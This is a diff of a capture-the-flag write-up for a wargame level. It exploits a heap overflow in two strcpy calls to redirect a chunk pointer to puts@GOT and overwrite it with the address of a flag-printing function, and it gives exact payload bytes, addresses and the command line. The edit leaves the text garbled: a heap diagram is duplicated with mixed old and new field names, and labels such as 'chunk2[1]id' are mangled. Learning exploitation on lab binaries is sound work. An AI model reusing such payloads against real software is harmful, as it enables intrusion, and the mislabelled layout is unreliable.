@@ -1,20 +1,15 @@
-# 🎯 Level7 - Heap Structure Corruption with GOT Overwrite
+# 🎯 Level7 - Heap Chunk Corruption with GOT Overwrite
 
 ![Helldivers Salute](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)
 
-Advanced heap exploitation - structure pointer corruption for arbitrary writes! 🔥
+Advanced heap exploitation - chunk pointer corruption for arbitrary writes! 🔥
 
 ## 📋 Binary Analysis
 
 ### 🎯 Key Functions (Decompiled)
 
 ```c
-char c[80];  // Global buffer for the flag
-
-struct data_struct {
-    int id;        // 4 bytes
-    char *data;    // 4 bytes pointer
-};
+char c[68];  // Global buffer for the flag
 
 void m(void)
 {
@@ -26,28 +21,30 @@ void m(void)
 
 int main(int argc, char **argv)
 {
-    struct data_struct *ptr1;
-    struct data_struct *ptr2;
+    int *chunk1;   // Points to first heap chunk (8 bytes: int + pointer)
+    int *chunk2;   // Points to second heap chunk (8 bytes: int + pointer)
     FILE *file;
     
-    // Allocate two structures and their data buffers
-    ptr1 = malloc(sizeof(struct data_struct));
-    ptr1->id = 1;
-    ptr1->data = malloc(8);                     // 8-byte buffer
+    // First allocation: 8 bytes storing [int, pointer]
+    chunk1 = (int *)malloc(8);
+    chunk1[0] = 1;                    // Store integer 1 at offset 0
+    chunk1[1] = (int)malloc(8);       // Store pointer at offset 4 (treating as int)
     
-    ptr2 = malloc(sizeof(struct data_struct));
-    ptr2->id = 2;
-    ptr2->data = malloc(8);                     // 8-byte buffer
+    // Second allocation: 8 bytes storing [int, pointer]
+    chunk2 = (int *)malloc(8);
+    chunk2[0] = 2;                    // Store integer 2 at offset 0
+    chunk2[1] = (int)malloc(8);       // Store pointer at offset 4 (treating as int)
     
-    // Vulnerable strcpy calls
-    strcpy(ptr1->data, argv[1]);                // ⚠️ No bounds check!
-    strcpy(ptr2->data, argv[2]);                // ⚠️ Writes to controlled pointer!
+    // Vulnerable: No bounds checking!
+    // chunk1[1] is a pointer stored as an int - cast it back to char* for strcpy
+    strcpy((char *)chunk1[1], argv[1]);  // ⚠️ Overflow can corrupt chunk2[1]
+    strcpy((char *)chunk2[1], argv[2]);  // ⚠️ Writes to controlled pointer!
     
     // Read flag into global 'c'
     file = fopen("/home/user/level8/.pass", "r");
-    fgets(c, 68, file);
+    fgets(c, 68, file);               // 0x44 = 68 in decimal
     
-    puts("~~");                                 // Just prints "~~"
+    puts("~~");                       // Just prints "~~"
     return 0;
 }
 ```
@@ -57,15 +54,15 @@ int main(int argc, char **argv)
 | Element | Address | Notes |
 |---------|---------|-------|
 | **Function `m()`** | `0x080484f4` | Target - prints flag |
-| **Global `c`** | `0x08049960` | 80-byte buffer for flag |
+| **Global `c`** | `0x08049960` | 68-byte buffer for flag |
 | **GOT `puts@GOT`** | `0x08049928` | We'll overwrite this |
-| **ptr1 struct** | `0x0804a008` | First heap structure |
-| **ptr1->data** | `0x0804a018` | 8-byte buffer (vulnerable) |
-| **ptr2 struct** | `0x0804a028` | Second heap structure |
-| **ptr2->data** | `0x0804a038` | 8-byte buffer |
+| **chunk1** | `0x0804a008` | First heap chunk (8 bytes: int + pointer) |
+| **chunk1[1]** | `0x0804a018` | 8-byte buffer (vulnerable) |
+| **chunk2** | `0x0804a028` | Second heap chunk (8 bytes: int + pointer) |
+| **chunk2[1] data** | `0x0804a038` | 8-byte buffer |
 
 **Key Observations:**
-- Two heap structures with embedded pointers
+- Two heap chunks storing [int, pointer] pairs (not structs!)
 - strcpy with no bounds checking on both buffers
 - Hidden function `m()` that prints global `c`
 - Program reads flag but only prints "~~"
@@ -73,15 +70,15 @@ int main(int argc, char **argv)
 
 ## 🚨 The Challenge
 
-This level introduces **heap structure corruption** - not just overflowing a buffer, but corrupting the structure's pointer to gain arbitrary write capability.
+This level introduces **heap chunk corruption** - not just overflowing a buffer, but corrupting a chunk's pointer to gain arbitrary write capability.
 
 **The Setup:**
 ```c
-ptr1 = {id: 1, data: 0x0804a018}  // Structure with pointer
-ptr2 = {id: 2, data: 0x0804a038}  // Structure with pointer
+chunk1 = [1, 0x0804a018]  // 8 bytes: int value + pointer
+chunk2 = [2, 0x0804a038]  // 8 bytes: int value + pointer
 
-strcpy(ptr1->data, argv[1]);      // Overflow! Can reach ptr2 structure
-strcpy(ptr2->data, argv[2]);      // Writes to wherever ptr2->data points!
+strcpy((char *)chunk1[1], argv[1]);  // Overflow! Can reach chunk2
+strcpy((char *)chunk2[1], argv[2]);  // Writes to wherever chunk2[1] points!
 ```
 
 **The Problem:**
@@ -90,32 +87,33 @@ strcpy(ptr2->data, argv[2]);      // Writes to wherever ptr2->data points!
 - We need to make the program execute `m()` which prints `c`
 
 **The Solution:**
-1. Overflow `ptr1->data` to corrupt `ptr2->data` pointer
-2. Make `ptr2->data` point to `puts@GOT`
+1. Overflow `chunk1[1]`'s data buffer to corrupt `chunk2[1]` pointer
+2. Make `chunk2[1]` point to `puts@GOT`
 3. Use `argv[2]` to overwrite `puts@GOT` with address of `m()`
 4. When `puts("~~")` is called → executes `m()` → prints flag!
 
 ## 🎯 How the Exploit Works
 
-### Understanding Heap Structures
+### Understanding Heap Chunks
 
-**What are Heap Structures?**
+**What are these heap chunks?**
 
-In this program, each "structure" is an 8-byte allocation containing:
-```c
-struct data_struct {
-    int id;        // 4 bytes - identifier
-    char *data;    // 4 bytes - pointer to another heap buffer
-};
+In this program, each "chunk" is an 8-byte allocation containing:
+```
+[int value (4 bytes)][pointer (4 bytes)]
 ```
 
-These structures create **pointer relationships** on the heap:
+Stored as an `int *` array:
+- `chunk[0]` = integer value (1 or 2)
+- `chunk[1]` = pointer to another heap buffer (stored as int, cast to pointer)
+
+These chunks create **pointer relationships** on the heap:
 ```
-ptr1 ──┐
-       ├──> [id: 1][data ptr] ──> [8-byte buffer for string]
-       
-ptr2 ──┐
-       ├──> [id: 2][data ptr] ──> [8-byte buffer for string]
+chunk1 ──┐
+         ├──> [1][pointer] ──> [8-byte buffer for argv[1]]
+         
+chunk2 ──┐
+         ├──> [2][pointer] ──> [8-byte buffer for argv[2]]
 ```
 
 ### Heap Layout Discovery
@@ -125,37 +123,37 @@ Using `ltrace` to see the allocations:
 ```bash
 $ ltrace ./level7 AAA BBB
 
-malloc(8)  = 0x0804a008  ← ptr1 structure
-malloc(8)  = 0x0804a018  ← ptr1->data buffer
-malloc(8)  = 0x0804a028  ← ptr2 structure
-malloc(8)  = 0x0804a038  ← ptr2->data buffer
+malloc(8)  = 0x0804a008  ← chunk1 (stores int + pointer)
+malloc(8)  = 0x0804a018  ← chunk1[1] buffer
+malloc(8)  = 0x0804a028  ← chunk2 (stores int + pointer)
+malloc(8)  = 0x0804a038  ← chunk2[1] data buffer
 ```
 
 **Distance calculations:**
-- From `ptr1->data` (0x0804a018) to `ptr2 structure` (0x0804a028): **16 bytes**
-- From `ptr1->data` (0x0804a018) to `ptr2->data field` (0x0804a02c): **20 bytes**
+- From `chunk1[1]` data buffer (0x0804a018) to `chunk2` (0x0804a028): **16 bytes**
+- From `chunk1[1]` data buffer (0x0804a018) to `chunk2[1]` pointer field (0x0804a02c): **20 bytes**
 
-### Visual: Heap Structure Layout
+### Visual: Heap Chunk Layout
 
 ```
 INITIAL STATE:
 ════════════════════════════════════════════════════════════════
 0x0804a008: ┌──────────────────────────────────────────────┐
-            │ ptr1 structure (8 bytes)                     │
-            │ [id = 1 (4 bytes)][data = 0x0804a018 (4B)]  │
-            │                            │                 │
-            │                            ↓                 │
+            │ chunk1 (8 bytes)                             │
+            │ [int = 1 (4 bytes)][pointer = 0x0804a018]   │
+            │                             │                │
+            │                             ↓                │
 0x0804a018: ├──────────────────────────────────────────────┤
-            │ ptr1->data buffer (8 bytes)                  │
+            │ chunk1[1] buffer (8 bytes)              │
             │ [empty - will hold argv[1]]                  │
             │                                              │
 0x0804a028: ├──────────────────────────────────────────────┤
-            │ ptr2 structure (8 bytes)         ← TARGET!   │
-            │ [id = 2 (4 bytes)][data = 0x0804a038 (4B)]  │
-            │                            │                 │
-            │                            ↓                 │
+            │ chunk2 (8 bytes)             ← TARGET!       │
+            │ [int = 2 (4 bytes)][pointer = 0x0804a038]   │
+            │                             │                │
+            │                             ↓                │
 0x0804a038: ├──────────────────────────────────────────────┤
-            │ ptr2->data buffer (8 bytes)                  │
+            │ chunk2[1] data buffer (8 bytes)              │
             │ [empty - will hold argv[2]]                  │
             └──────────────────────────────────────────────┘
 
@@ -163,7 +161,52 @@ INITIAL STATE:
 AFTER OVERFLOW (argv[1] = "A"*20 + "\x28\x99\x04\x08"):
 ════════════════════════════════════════════════════════════════
 0x0804a008: ┌──────────────────────────────────────────────┐
-            │ ptr1 structure                               │
+            │ chunk1                                       │
+            │ [int = 1][pointer = 0x0804a018]              │
+            │                   │                          │
+            │                   ↓                          │
+0x0804a018: ├──────────────────────────────────────────────┤
+            │ AAAAAAAA (8 bytes)                           │
+            │ AAAAAAAA (8 bytes)                           │ ← 16 bytes overflow
+            │ AAAA     (4 bytes)                           │ ← +4 bytes overflow
+0x0804a028: ├──────────────────────────────────────────────┤
+            │ chunk2 (CORRUPTED!)                          │
+            │ [int = 0x41414141 (overwritten)]             │
+0x0804a02c: │ [pointer = 0x08049928] ← puts@GOT! ✅        │
+            │           │                                  │
+            │           └─────────────────┐               │
+0x0804a038: ├──────────────────────────────────────────────┤
+            │                            ↓                 │
+            └──────────────────────────────────────────────┘
+            
+Now chunk2[1] points to puts@GOT instead of 0x0804a038!
+```
+INITIAL STATE:
+════════════════════════════════════════════════════════════════
+0x0804a008: ┌──────────────────────────────────────────────┐
+            │ chunk1 (8 bytes)                     │
+            │ [id = 1 (4 bytes)][data = 0x0804a018 (4B)]  │
+            │                            │                 │
+            │                            ↓                 │
+0x0804a018: ├──────────────────────────────────────────────┤
+            │ chunk1[1] buffer (8 bytes)                  │
+            │ [empty - will hold argv[1]]                  │
+            │                                              │
+0x0804a028: ├──────────────────────────────────────────────┤
+            │ chunk2 (8 bytes)         ← TARGET!   │
+            │ [id = 2 (4 bytes)][data = 0x0804a038 (4B)]  │
+            │                            │                 │
+            │                            ↓                 │
+0x0804a038: ├──────────────────────────────────────────────┤
+            │ chunk2[1] buffer (8 bytes)                  │
+            │ [empty - will hold argv[2]]                  │
+            └──────────────────────────────────────────────┘
+
+
+AFTER OVERFLOW (argv[1] = "A"*20 + "\x28\x99\x04\x08"):
+════════════════════════════════════════════════════════════════
+0x0804a008: ┌──────────────────────────────────────────────┐
+            │ chunk1                               │
             │ [id = 1][data = 0x0804a018]                  │
             │                  │                           │
             │                  ↓                           │
@@ -172,7 +215,7 @@ AFTER OVERFLOW (argv[1] = "A"*20 + "\x28\x99\x04\x08"):
             │ AAAAAAAA (8 bytes)                           │ ← 16 bytes overflow
             │ AAAA     (4 bytes)                           │ ← +4 bytes overflow
 0x0804a028: ├──────────────────────────────────────────────┤
-            │ ptr2 structure (CORRUPTED!)                  │
+            │ chunk2 (CORRUPTED!)                  │
             │ [id = 0x41414141 (overwritten)]             │
 0x0804a02c: │ [data = 0x08049928] ← puts@GOT! ✅          │
             │          │                                   │
@@ -181,12 +224,12 @@ AFTER OVERFLOW (argv[1] = "A"*20 + "\x28\x99\x04\x08"):
             │                            ↓                 │
             └──────────────────────────────────────────────┘
             
-Now ptr2->data points to puts@GOT instead of 0x0804a038!
+Now chunk2[1] points to puts@GOT instead of 0x0804a038!
 
 
 AFTER SECOND strcpy (argv[2] = "\xf4\x84\x04\x08"):
 ════════════════════════════════════════════════════════════════
-strcpy(ptr2->data, argv[2]) becomes:
+strcpy(chunk2[1], argv[2]) becomes:
 strcpy(0x08049928, "\xf4\x84\x04\x08")
        └─ puts@GOT   └─ address of m()
 
@@ -198,17 +241,17 @@ GOT Table:
 
 **Stage 1: Corrupt Pointer (argv[1])**
 
-Overflow `ptr1->data` to overwrite `ptr2->data` field:
+Overflow `chunk1[1]` to overwrite `chunk2[1]` field:
 ```python
 argv[1] = "A" * 20 + "\x28\x99\x04\x08"
            └─padding┘  └─ puts@GOT ─┘
 ```
 
 **Breakdown:**
-- Bytes 0-7: Fill `ptr1->data` buffer
+- Bytes 0-7: Fill `chunk1[1]` buffer
 - Bytes 8-15: Overflow into heap metadata
-- Bytes 16-19: Overflow into `ptr2->id` field (doesn't matter)
-- **Bytes 20-23: Overwrite `ptr2->data` field with `0x08049928`** (puts@GOT)
+- Bytes 16-19: Overflow into `chunk2[1]id` field (doesn't matter)
+- **Bytes 20-23: Overwrite `chunk2[1]` field with `0x08049928`** (puts@GOT)
 
 **Stage 2: Exploit Corrupted Pointer (argv[2])**
 
@@ -218,8 +261,8 @@ argv[2] = "\xf4\x84\x04\x08"
           └─ address of m() ─┘
 ```
 
-When `strcpy(ptr2->data, argv[2])` executes:
-- `ptr2->data` = `0x08049928` (puts@GOT)
+When `strcpy(chunk2[1], argv[2])` executes:
+- `chunk2[1]` = `0x08049928` (puts@GOT)
 - Copies `"\xf4\x84\x04\x08"` to address `0x08049928`
 - **Result: `puts@GOT` now points to `m()`!**
 
@@ -236,8 +279,8 @@ Program calls `puts("~~")`:
 
 This exploit demonstrates a powerful technique: **write-what-where**
 
-By corrupting a structure's pointer:
-- **WHERE**: We control the destination (`ptr2->data` = `puts@GOT`)
+By corrupting a heap chunk's pointer:
+- **WHERE**: We control the destination (`chunk2[1]` = `puts@GOT`)
 - **WHAT**: We control the value (`argv[2]` = address of `m()`)
 
 This is more powerful than simple overflows - we can write arbitrary values to arbitrary memory locations!
@@ -255,35 +298,35 @@ Command: ./level7 "AAA...AAA\x28\x99\x04\x08" "\xf4\x84\x04\x08"
 Step 2: Heap Allocations
 ─────────────────────────
 malloc(8): ptr1       = 0x0804a008
-malloc(8): ptr1->data = 0x0804a018
+malloc(8): chunk1[1] = 0x0804a018
 malloc(8): ptr2       = 0x0804a028
-malloc(8): ptr2->data = 0x0804a038
+malloc(8): chunk2[1] = 0x0804a038
 
 Initial state:
-  ptr1->id = 1
-  ptr1->data = 0x0804a018
-  ptr2->id = 2
-  ptr2->data = 0x0804a038
+  chunk1[1]id = 1
+  chunk1[1] = 0x0804a018
+  chunk2[1]id = 2
+  chunk2[1] = 0x0804a038
 
 
 Step 3: First strcpy (argv[1] - Structure Corruption)
 ──────────────────────────────────────────────────────
-strcpy(ptr1->data, argv[1]):
+strcpy(chunk1[1], argv[1]):
   Copies 24 bytes: "AAA...AAA\x28\x99\x04\x08"
   
   Overwrites:
-    - ptr1->data buffer (8 bytes)
+    - chunk1[1] buffer (8 bytes)
     - Heap metadata (8 bytes)
-    - ptr2->id (4 bytes) → becomes 0x41414141
-    - ptr2->data (4 bytes) → becomes 0x08049928 ✅
+    - chunk2[1]id (4 bytes) → becomes 0x41414141
+    - chunk2[1] (4 bytes) → becomes 0x08049928 ✅
 
 Result:
-  ptr2->data = 0x08049928 (puts@GOT)
+  chunk2[1] = 0x08049928 (puts@GOT)
 
 
 Step 4: Second strcpy (argv[2] - GOT Overwrite)
 ────────────────────────────────────────────────
-strcpy(ptr2->data, argv[2]) becomes:
+strcpy(chunk2[1], argv[2]) becomes:
 strcpy(0x08049928, "\xf4\x84\x04\x08")
 
 Writes to GOT:
@@ -327,10 +370,10 @@ Flag printed to stdout with timestamp.
 
 | Requirement | Status | Explanation |
 |-------------|--------|-------------|
-| **Heap overflow** | ✅ | strcpy() has no bounds checking on ptr1->data |
-| **Structure corruption** | ✅ | Overflow reaches ptr2 structure (20 bytes away) |
-| **Pointer control** | ✅ | We can overwrite ptr2->data field |
-| **Write primitive** | ✅ | strcpy(ptr2->data, argv[2]) writes to controlled address |
+| **Heap overflow** | ✅ | strcpy() has no bounds checking on chunk1[1] |
+| **Structure corruption** | ✅ | Overflow reaches chunk2 (20 bytes away) |
+| **Pointer control** | ✅ | We can overwrite chunk2[1] field |
+| **Write primitive** | ✅ | strcpy(chunk2[1], argv[2]) writes to controlled address |
 | **Known addresses** | ✅ | m() at 0x080484f4, puts@GOT at 0x08049928 |
 | **Writable GOT** | ✅ | No RELRO protection |
 | **Target function** | ✅ | m() prints global c |
@@ -341,7 +384,7 @@ Flag printed to stdout with timestamp.
 **Exploit Evolution:**
 - **Level5**: Format string → direct GOT overwrite
 - **Level6**: Heap overflow → function pointer overwrite
-- **Level7**: **Heap structure corruption → indirect GOT overwrite** ⭐ NEW!
+- **Level7**: **Heap chunk corruption → indirect GOT overwrite** ⭐ NEW!
 
 This combines multiple techniques:
 1. **Heap overflow** (like level6)
@@ -380,7 +423,7 @@ The flag is printed along with the current timestamp!
 > 
 > **Safe coding practices:**
 > - Use `strncpy()` or `strlcpy()` instead of `strcpy()`
-> - Validate structure integrity before dereferencing pointers
+> - Validate chunk integrity before dereferencing pointers
 > - Use safe string handling libraries
 > - Enable all modern protections (RELRO, ASLR, etc.)
 
